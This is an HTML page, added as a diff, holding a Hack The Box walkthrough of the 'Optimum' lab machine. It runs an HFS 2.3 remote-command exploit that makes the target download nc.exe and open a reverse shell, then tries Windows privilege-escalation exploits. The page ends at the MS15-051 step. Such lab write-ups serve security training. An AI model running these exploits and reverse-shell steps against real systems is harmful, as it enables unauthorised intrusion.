@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.5.45">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="0xPThree">
+<meta name="dcterms.date" content="2019-04-14">
+<meta name="description" content="N/A">
+
+<title>Optimum - Hack The Box</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../favicon.ico" rel="icon">
+<script src="../../site_libs/quarto-html/quarto.js"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>
+
+<script type="text/javascript">
+
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
+</script>
+
+
+<link rel="stylesheet" href="../../scss/styles.css">
+<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
+<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
+<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
+</head>
+
+<body class="nav-fixed">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top quarto-banner">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../index.html"> 
+<span class="menu-text">Home</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
+<span class="menu-text">Notes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Optimum - Hack The Box</h1>
+                  <div>
+        <div class="description">
+          N/A
+        </div>
+      </div>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hackthebox</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>0xPThree </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">April 14, 2019</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">On this page</h2>
+   
+  <ul>
+  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
+  <ul class="collapse">
+  <li><a href="#enumeration" id="toc-enumeration" class="nav-link" data-scroll-target="#enumeration">Enumeration</a>
+  <ul class="collapse">
+  <li><a href="#dirb" id="toc-dirb" class="nav-link" data-scroll-target="#dirb">DIRB:</a></li>
+  <li><a href="#nikto" id="toc-nikto" class="nav-link" data-scroll-target="#nikto">NIKTO:</a></li>
+  <li><a href="#ms15-076" id="toc-ms15-076" class="nav-link" data-scroll-target="#ms15-076">MS15-076:</a></li>
+  <li><a href="#ms15-051" id="toc-ms15-051" class="nav-link" data-scroll-target="#ms15-051">MS15-051:</a></li>
+  <li><a href="#ms16-032" id="toc-ms16-032" class="nav-link" data-scroll-target="#ms16-032">MS16-032:</a></li>
+  <li><a href="#ms16-135" id="toc-ms16-135" class="nav-link" data-scroll-target="#ms16-135">MS16-135:</a></li>
+  <li><a href="#ms16-098" id="toc-ms16-098" class="nav-link" data-scroll-target="#ms16-098">MS16-098:</a></li>
+  </ul></li>
+  </ul></li>
+  </ul>
+</nav>
+    </div>
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+
+<p><img src="images/optimum_logo.png" class="img-fluid">{: style=“float: right; width: 200px; margin-left: 2em”}</p>
+<p>N/A<br><br><br><br><br><br><br></p>
+<hr>
+<section id="user" class="level1">
+<h1>USER</h1>
+<section id="enumeration" class="level2">
+<h2 class="anchored" data-anchor-id="enumeration">Enumeration</h2>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/optimum]#</span> nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-sCV</span> 10.10.10.8 <span class="at">--open</span>                                                                       <span class="er">(</span><span class="ex">master✱</span><span class="kw">)</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>  <span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>  <span class="ex">80/tcp</span> open  http    HttpFileServer httpd 2.3</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">|</span><span class="ex">_http-server-header:</span> HFS 2.3</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">|</span><span class="ex">_http-title:</span> HFS /</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Service</span> Info: OS: Windows<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:microsoft:windows</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<section id="dirb" class="level3">
+<h3 class="anchored" data-anchor-id="dirb">DIRB:</h3>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">-</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="nikto" class="level3">
+<h3 class="anchored" data-anchor-id="nikto">NIKTO:</h3>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">-</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Visiting the URL we quickly see valuable server information:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Server <span class="ex">information</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> HttpFileServer <span class="ex">2.3</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Server <span class="ex">time:</span> 8/3/2021 7:12:34 μμ</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;</span> Server <span class="ex">uptime:</span> 00:09:16</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/optimum]#</span> searchsploit hfs 2.3                                                                                     <span class="er">(</span><span class="ex">master✱</span><span class="kw">)</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">-----------------------------------------------------------------------------------------------------------</span> <span class="at">---------------------------------</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Exploit</span> Title                                                                                             <span class="kw">|</span>  <span class="ex">Path</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">-----------------------------------------------------------------------------------------------------------</span> <span class="at">---------------------------------</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">HFS</span> Http File Server 2.3m Build 300 <span class="at">-</span> Buffer Overflow <span class="er">(</span><span class="ex">PoC</span><span class="kw">)</span>                                                <span class="kw">|</span> <span class="ex">multiple/remote/48569.py</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Rejetto</span> HTTP File Server <span class="er">(</span><span class="ex">HFS</span><span class="kw">)</span> <span class="ex">2.2/2.3</span> <span class="at">-</span> Arbitrary File Upload                                             <span class="kw">|</span> <span class="ex">multiple/remote/30850.txt</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Rejetto</span> HTTP File Server <span class="er">(</span><span class="ex">HFS</span><span class="kw">)</span> <span class="ex">2.3.x</span> <span class="at">-</span> Remote Command Execution <span class="er">(</span><span class="ex">1</span><span class="kw">)</span>                                        <span class="kw">|</span> <span class="ex">windows/remote/34668.txt</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Rejetto</span> HTTP File Server <span class="er">(</span><span class="ex">HFS</span><span class="kw">)</span> <span class="ex">2.3.x</span> <span class="at">-</span> Remote Command Execution <span class="er">(</span><span class="ex">2</span><span class="kw">)</span>                                        <span class="kw">|</span> <span class="ex">windows/remote/39161.py</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Rejetto</span> HTTP File Server <span class="er">(</span><span class="ex">HFS</span><span class="kw">)</span> <span class="ex">2.3a/2.3b/2.3c</span> <span class="at">-</span> Remote Command Execution                                   <span class="kw">|</span> <span class="ex">windows/webapps/34852.txt</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="ex">-----------------------------------------------------------------------------------------------------------</span> <span class="at">---------------------------------</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The python script <code>windows/remote/39161.py</code> looks promising, lets try it out.</p>
+<ul>
+<li>Host a webserver on port 80, containing nc.exe</li>
+<li>Change the script’s local IP and port</li>
+<li>Execute!</li>
+</ul>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/optimum]#</span> python 39161.py 10.10.10.8 80</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/srv/pub-share]#</span> python3 <span class="at">-m</span> http.server 80</span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er">(</span><span class="ex">http://0.0.0.0:80/</span><span class="kw">)</span> <span class="ex">...</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.10.8</span> <span class="at">-</span> <span class="at">-</span> [02/Mar/2021 10:39:29] <span class="st">"GET /nc.exe HTTP/1.1"</span> 200 <span class="at">-</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.10.8</span> <span class="at">-</span> <span class="at">-</span> [02/Mar/2021 10:39:29] <span class="st">"GET /nc.exe HTTP/1.1"</span> 200 <span class="at">-</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.10.8</span> <span class="at">-</span> <span class="at">-</span> [02/Mar/2021 10:39:29] <span class="st">"GET /nc.exe HTTP/1.1"</span> 200 <span class="at">-</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.10.8</span> <span class="at">-</span> <span class="at">-</span> [02/Mar/2021 10:39:29] <span class="st">"GET /nc.exe HTTP/1.1"</span> 200 <span class="at">-</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/optimum]#</span> rlwrap nc <span class="at">-lvnp</span> 4499                                                                                     <span class="er">(</span><span class="ex">master✱</span><span class="kw">)</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>  <span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4499 ...</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>  <span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.8</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.10.8]</span> 49173</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Microsoft</span> Windows [Version 6.3.9600]</span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>  <span class="kw">(</span><span class="ex">c</span><span class="kw">)</span> <span class="ex">2013</span> Microsoft Corporation. All rights reserved.</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>  <span class="ex">C:\Users\kostas\Desktop</span><span class="op">&gt;</span> type user.txt.txt</span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>    <span class="ex">d0c39409d7b994a9a1389ebf38ef5f73</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<hr>
+<p><br><br> # ROOT ## Enumeration</p>
+<p>Run Watson exploit suggester.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Users\kostas\Desktop</span><span class="op">&gt;</span> <span class="dt">\\</span>10.10.14.8\pub-share\WatsonNet4AnyCPU.exe</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">__</span>    __      _</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>   <span class="ex">/</span> / /\ \ \__ _<span class="kw">|</span> <span class="kw">|</span><span class="ex">_</span> ___  ___  _ __</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>   <span class="ex">\ \/</span>  <span class="dt">\/</span> / _<span class="kw">`</span> <span class="kw">|</span> <span class="ex">__/</span> __<span class="kw">|</span><span class="ex">/</span> _ <span class="dt">\|</span> <span class="st">'_ \</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="st">    \  /\  / (_| | |_\__ \ (_) | | | |</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="st">     \/  \/ \__,_|\__|___/\___/|_| |_|</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="st">                             v0.1</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="st">                    Sherlock sucks...</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="st">                     @_RastaMouse</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="st">[*] OS Build number: 9600</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="st">[*] CPU Address Width: 64</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="st">[*] Process IntPtr Size: 8</span></span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a><span class="st">[*] Using Windows path: C:\WINDOWS\System32</span></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a><span class="st">[*] Appears vulnerable to MS15-051</span></span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a><span class="st">  [&gt;] author: "0xPThree"</span></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a><span class="st">description: An EoP exists due to improper object handling in the win32k.sys kernel mode driver.</span></span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a><span class="st">  [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb</span></span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a><span class="st">  [&gt;] Notes: None.</span></span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a><span class="st">[*] Appears vulnerable to MS15-076</span></span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a><span class="st">  [&gt;] author: "0xPThree"</span></span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a><span class="st">description: Local DCOM DCE/RPC connections can be reflected back to a listening TCP socket allowing access to an NTLM authentication challenge for LocalSystem, which can be replayed to the local DCOM activation service to elevate privileges.</span></span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true" tabindex="-1"></a><span class="st">  [&gt;] Exploit: https://www.exploit-db.com/exploits/37768/</span></span>
+<span id="cb7-28"><a href="#cb7-28" aria-hidden="true" tabindex="-1"></a><span class="st">  [&gt;] Notes: None.</span></span>
+<span id="cb7-29"><a href="#cb7-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-30"><a href="#cb7-30" aria-hidden="true" tabindex="-1"></a><span class="st">[*] Appears vulnerable to MS15-078</span></span>
+<span id="cb7-31"><a href="#cb7-31" aria-hidden="true" tabindex="-1"></a><span class="st">  [&gt;] author: "0xPThree"</span></span>
+<span id="cb7-32"><a href="#cb7-32" aria-hidden="true" tabindex="-1"></a><span class="st">description: An EoP exists due to a pool based buffer overflow in the atmfd.dll driver when parsing a malformed font.</span></span>
+<span id="cb7-33"><a href="#cb7-33" aria-hidden="true" tabindex="-1"></a><span class="st">  [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_078_atmfd_bof.rb</span></span>
+<span id="cb7-34"><a href="#cb7-34" aria-hidden="true" tabindex="-1"></a><span class="st">  [&gt;] Notes: None.</span></span>
+<span id="cb7-35"><a href="#cb7-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-36"><a href="#cb7-36" aria-hidden="true" tabindex="-1"></a><span class="st">[*] Appears vulnerable to MS16-032</span></span>
+<span id="cb7-37"><a href="#cb7-37" aria-hidden="true" tabindex="-1"></a><span class="st">  [&gt;] author: "0xPThree"</span></span>
+<span id="cb7-38"><a href="#cb7-38" aria-hidden="true" tabindex="-1"></a><span class="st">description: An EoP exists due to a lack of sanitization of standard handles in Windows'</span> Secondary Logon Service.</span>
+<span id="cb7-39"><a href="#cb7-39" aria-hidden="true" tabindex="-1"></a>  <span class="ex">[</span><span class="op">&gt;</span>] Exploit: https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1</span>
+<span id="cb7-40"><a href="#cb7-40" aria-hidden="true" tabindex="-1"></a>  <span class="ex">[</span><span class="op">&gt;</span>] Notes: None.</span>
+<span id="cb7-41"><a href="#cb7-41" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-42"><a href="#cb7-42" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Appears vulnerable to MS16-034</span>
+<span id="cb7-43"><a href="#cb7-43" aria-hidden="true" tabindex="-1"></a>  <span class="ex">[</span><span class="op">&gt;</span>] author: <span class="st">"0xPThree"</span></span>
+<span id="cb7-44"><a href="#cb7-44" aria-hidden="true" tabindex="-1"></a><span class="ex">description:</span> An EoP exist when the Windows kernel-mode driver fails to properly handle objects in memory.</span>
+<span id="cb7-45"><a href="#cb7-45" aria-hidden="true" tabindex="-1"></a>  <span class="ex">[</span><span class="op">&gt;</span>] Exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034</span>
+<span id="cb7-46"><a href="#cb7-46" aria-hidden="true" tabindex="-1"></a>  <span class="ex">[</span><span class="op">&gt;</span>] Notes: None.</span>
+<span id="cb7-47"><a href="#cb7-47" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-48"><a href="#cb7-48" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Finished. Found 5 vulns :<span class="er">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Lets try the exploits.</p>
+</section>
+<section id="ms15-076" class="level3">
+<h3 class="anchored" data-anchor-id="ms15-076">MS15-076:</h3>
+<p>“local DCOM activation service to elevate privileges” sound promising as we want to escalate.<br> Reading about the exploit it’s only tested on x64/x86 Windows 7/8.1, this box is Win2012 - lets try it anyway.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\tmp</span><span class="op">&gt;</span> //10.10.14.8/pub-share/ms15-076/Trebuchet.exe C:<span class="dt">\U</span>sers<span class="dt">\A</span>dministrator<span class="dt">\D</span>esktop<span class="dt">\r</span>oot.txt C:<span class="dt">\t</span>mp<span class="dt">\t</span>est.txt</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>  <span class="ex">[!]</span> Error reading initial file!</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>However, reading a file we know exists work:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a>  <span class="ex">C:\tmp</span><span class="op">&gt;</span> //10.10.14.8/pub-share/ms15-076/Trebuchet.exe C:<span class="dt">\U</span>sers<span class="dt">\k</span>ostas<span class="dt">\D</span>esktop<span class="dt">\u</span>ser.txt.txt C:<span class="dt">\t</span>mp<span class="dt">\t</span>est.txt</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">[+]</span> Loaded in 32 bytes.</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">[+]</span> Getting out our toolbox...</span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Junction</span> created for C:<span class="dt">\W</span>indows<span class="dt">\t</span>emp<span class="dt">\E</span>QGJWGJW <span class="op">&lt;&lt;===&gt;&gt;</span> C:\users\public\libraries\Sym<span class="dt">\</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>    <span class="pp">[</span><span class="ss">+</span><span class="pp">]</span> Waiting for CreateSymlink to close...</span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="st">    Opened Link </span><span class="dt">\R</span><span class="st">PC Control</span><span class="dt">\ </span><span class="st">(2) -&gt; </span><span class="dt">\?</span><span class="st">?</span><span class="dt">\C</span><span class="st">:</span><span class="dt">\t</span><span class="st">mp</span><span class="dt">\t</span><span class="st">est.txt: 000000A8</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="st">    Holding Symlink open for 10 seconds...</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="st">    [+] Cleaning Up!</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="st">  C:</span><span class="dt">\t</span><span class="st">mp&gt; type test.txt</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="st">    d0c39409d7b994a9a1389ebf38ef5f73</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="ms15-051" class="level3">
+<h3 class="anchored" data-anchor-id="ms15-051">MS15-051:</h3>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\tmp</span><span class="op">&gt;</span> //10.10.14.8/pub-share/Taihou64.exe whoami</span>
